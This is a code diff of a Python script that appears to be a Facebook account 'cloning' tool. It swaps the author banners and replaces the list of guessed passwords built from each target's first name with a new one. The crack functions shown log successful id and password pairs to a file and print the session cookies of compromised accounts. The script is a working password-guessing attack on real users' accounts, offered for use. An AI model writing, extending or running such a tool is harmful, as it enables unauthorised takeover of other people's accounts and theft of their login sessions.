@@ -297,15 +297,15 @@ def banner():
          __|__
        //.=|=.\\
       // .=|=. \\
-      \\ .=|=. //.   CODE BY  : XULA MNAL BAZ
-       \\(_=_)//.    Telegram : X_ula0
-        (:| |:).      Github   : https://t.me/QUTAA_EXPERT
-         || ||.       Team     : PYTHON_KURD
-         () ().      Version  : V.1
+      \\ .=|=. //.   CODE BY  : shaba_shelbe     @JG_HAMAE
+       \\(_=_)//.    Telegram : 
+        (:| |:).      Github   : https://t.me/shaba_EXPERT
+         || ||.       Team     : shaba
+         () ().      Version  : V.3
          || ||
          || ||                           
- ╔╦══• •✠•❀ XCARET ❀•✠ • •══╦╗
- ╚╩══• •✠•❀ XCARET ❀•✠ • •══╩╝
+ ╔╦══• •✠•❀ shaba ❀•✠ • •══╦╗
+ ╚╩══• •✠•❀ hama ❀•✠ • •══╩╝
 
 ---------------------------------------------------------------------
  🎀  Don't Minimize When Clonning
@@ -812,13 +812,13 @@ def passwrd():
 　　 　　>　 　 　,)
 　　　　　∠_,,,/
 
-                             CODE BY  : XULA MNAL BAZ
+                             CODE BY  : shaba_shelbe
                              Telegram : X_ula0
-                             Github   : https://t.me/QUTAA_EXPERT
-                             Team     : XULA OR HALO
+                             Github   : https://t.me/shaba_shelbe
+                             Team     : shaba_shelbe
                              Version  : V.1
- ╔╦══• •✠•❀ XCARET ❀•✠ • •══╦╗
- ╚╩══• •✠•❀ XCARET ❀•✠ • •══╩╝
+ ╔╦══• •✠•❀ shaba ❀•✠ • •══╦╗
+ ╚╩══• •✠•❀ hama ❀•✠ • •══╩╝
 
 ---------------------------------------------------------------------
  🎀  Don't Minimize When Clonning
@@ -828,7 +828,7 @@ def passwrd():
 [+] PREMIUM STATUS
 
 ----------------------------------------------------------------------
-[+] TOOL BY MR.XULA
+[+] TOOL BY shaba_shelbe   @JG_HAMAE
 [+] CLONING HAS STARTED
 [+] PROCESSING
 ----------------------------------------------------------------------
@@ -843,20 +843,31 @@ def passwrd():
 						pass
 					else:
 						pwv.append(nmf)
-						pwv.append(frs+'123')
+						pwv.append(frs+frs)
+						pwv.append(frs+''+frs)
+						pwv.append('1122334455')
+						pwv.append(frs+'1988')
+						pwv.append(frs+'1989')
+						pwv.append(frs+'1990')
+						pwv.append(frs+'1991')
+						pwv.append(frs+'1992')
+						pwv.append(frs+'1993')						
+						pwv.append(frs+'1994')						
+						pwv.append(frs+'1995')						
+						pwv.append(frs+'0750')
+						pwv.append(frs+'112233')
 						pwv.append(frs+'1234')
 						pwv.append(frs+'12345')
+						pwv.append(frs+'123456')
+						pwv.append(frs+'123456789')
+						pwv.append(frs+'1234567890')
+						pwv.append(frs+'4321')
+						pwv.append(frs+'321')
 						pwv.append(frs+'54321')
-						pwv.append(frs+'2003')
-						pwv.append(frs+'2000')
-						pwv.append('123'+'123'+frs)
-						pwv.append(frs+'2002')
-						pwv.append(frs+frs+'123')						
-						pwv.append(frs+'112233')						
-						pwv.append('12345'+frs+'12345')						
-						pwv.append(frs+'1999')
-						pwv.append(frs+'1998')
-						pwv.append(frs+'1997')									        
+						pwv.append('123'+frs)
+						pwv.append('1234'+frs)
+						pwv.append('12345'+frs)
+						pwv.append('123456'+frs)
 
 				else:
 
@@ -868,21 +879,31 @@ def passwrd():
 
 					else:
 						pwv.append(nmf)
-						pwv.append(frs+'123')
-						pwv.append(frs+'1234')
+						pwv.append(frs+frs)
+						pwv.append(frs+''+frs)
+						pwv.append('1122334455')
+						pwv.append(frs+'1988')
+						pwv.append(frs+'1989')
+						pwv.append(frs+'1990')
+						pwv.append(frs+'1991')
+						pwv.append(frs+'1992')
+						pwv.append(frs+'1993')						
+						pwv.append(frs+'1994')						
+						pwv.append(frs+'1995')						
+						pwv.append(frs+'0750')
+						pwv.append(frs+'112233')
+						pwv.append(frs+'1234')						
 						pwv.append(frs+'12345')
+						pwv.append(frs+'123456')
+						pwv.append(frs+'123456789')
+						pwv.append(frs+'1234567890')
+						pwv.append(frs+'4321')
+						pwv.append(frs+'321')
 						pwv.append(frs+'54321')
-						pwv.append(frs+'2003')
-						pwv.append(frs+'2000')
-						pwv.append('123'+'123'+frs)
-						pwv.append(frs+'2002')
-						pwv.append(frs+frs+'123')						
-						pwv.append(frs+'112233')						
-						pwv.append('12345'+frs+'12345')						
-						pwv.append(frs+'1999')
-						pwv.append(frs+'1998')
-						pwv.append(frs+'1997')						
+						pwv.append('123'+frs)
 						pwv.append('1234'+frs)
+						pwv.append('12345'+frs)
+						pwv.append('123456'+frs)
 				if 'ya' in pwpluss: 
 					for xpwd in pwnya:
 						pwv.append(xpwd)
@@ -957,7 +978,7 @@ def crack(idf,pwv):
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r\x1b[1;92m [ Qᴹᴿ᭄QUTA-OK ] {idf} | {pw} | {kuki}')
+				print(f'\r\x1b[1;92m [ sᴹᴿ᭄shaba-OK ] {idf} | {pw} | {kuki}')
 				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
 				cek_apk(kuki)
 				break
@@ -974,7 +995,7 @@ def crackmbasic(idf,pwv):
 	ua = random.choice(ugen)
 	#ua2 = random.choice(ugen2)
 	ses = requests.Session()
-	print("\r\u001b[37;1mr[ Qᴹᴿ᭄QUTA ] ["+str(loop)+"|"+str(len(id))+"] [\u001b[32;1m"+str(ok)+"\u001b[37;1m=\u001b[33;1m"+str(cp)+"\u001b[37;1m]",end="")
+	print("\r\u001b[37;1mr[ sᴹᴿ᭄shaba ] ["+str(loop)+"|"+str(len(id))+"] [\u001b[32;1m"+str(ok)+"\u001b[37;1m=\u001b[33;1m"+str(cp)+"\u001b[37;1m]",end="")
 	#prog.update(des,description=f"[bold white][MR.KUBRA][bold white] [{loop}|{len(id)}]  [[bold green]{ok}[/]=[bold yellow]{cp}[/]]")
 	#prog.advance(des) 
 	for pw in pwv:
